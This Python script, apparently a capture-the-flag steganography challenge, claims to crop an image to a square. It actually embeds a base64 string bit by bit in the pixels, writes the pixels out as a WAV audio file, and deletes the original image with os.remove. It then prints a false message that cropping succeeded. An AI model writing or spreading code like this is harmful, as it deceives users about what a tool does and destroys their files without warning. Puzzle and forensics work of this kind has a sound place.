import argparse
from PIL import Image
import numpy as np
import scipy.io.wavfile as wavfile
import base64
import os 

def image_cropper(image_path, text ,wav_output_path):
    image = Image.open(image_path)
    
    if image.mode != 'RGB':
        image = image.convert('RGB')
    
    # Crop the image to 1:1
    image_width, image_height = image.size
    min_dimension = min(image_width, image_height)
    left = (image_width - min_dimension) // 2
    top = (image_height - min_dimension) // 2
    right = left + min_dimension
    bottom = top + min_dimension
    image = image.crop((left, top, right, bottom))

    binary_text = ''.join(format(ord(char), '08b') for char in text)
    binary_length = format(len(binary_text), '016b')

    max_chars = (image.size[0] * image.size[1] * 3) // 8
    if len(binary_text) + len(binary_length) > max_chars:
        raise ValueError("Text too long to hide in the image.")

    binary_data = binary_length + binary_text

    pixels = list(image.getdata())
    encoded_pixels = []
    binary_index = 0

    for pixel in pixels:
        if binary_index < len(binary_data):
            if image.mode == 'RGB':
                red, green, blue = pixel
            elif image.mode == 'L': 
                red = green = blue = pixel
            else:
                raise ValueError("Unsupported image mode.")
            
            if binary_data[binary_index] == '1' and red % 2 == 0:
                red += 1
            elif binary_data[binary_index] == '0' and red % 2 == 1:
                red -= 1
            binary_index += 1

            if binary_index < len(binary_data):
                if binary_data[binary_index] == '1' and green % 2 == 0:
                    green += 1
                elif binary_data[binary_index] == '0' and green % 2 == 1:
                    green -= 1
                binary_index += 1

            if binary_index < len(binary_data):
                if binary_data[binary_index] == '1' and blue % 4 < 2:
                    blue += 2
                elif binary_data[binary_index] == '0' and blue % 4 >= 2:
                    blue -= 2
                binary_index += 1

            encoded_pixels.append((red, green, blue))
        else:
            encoded_pixels.append(pixel)

    encoded_image = Image.new(image.mode, image.size)
    encoded_image.putdata(encoded_pixels)
    
    if encoded_image.mode != 'RGB':
        encoded_image = encoded_image.convert('RGB')

    pixels = np.array(encoded_image)
    red_channel = pixels[:,:,0]
    green_channel = pixels[:,:,1]
    blue_channel = pixels[:,:,2]

    red_signal = (red_channel.flatten() / 255.0) * 2 - 1
    green_signal = (green_channel.flatten() / 255.0) * 2 - 1
    blue_signal = (blue_channel.flatten() / 255.0) * 2 - 1

    audio_signal = np.column_stack((red_signal, green_signal, blue_signal)).flatten()

    wavfile.write(wav_output_path, 44100, audio_signal.astype(np.float32))
    os.remove(image_path)
    print("Image Cropped Successfully!")
    print("Thanks for using our script! :)")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Easily crop your image to 1:1 ratio")
    parser.add_argument("--image", type=str, help="Path to the input image")
    parser.add_argument("--output", type=str, help="Path to save the output")
    args = parser.parse_args()

    if not args.image or not args.output:
        parser.print_help()
    else:
        text = base64.b64encode(b"REDACTED").decode()
        image_cropper(args.image, text, args.output)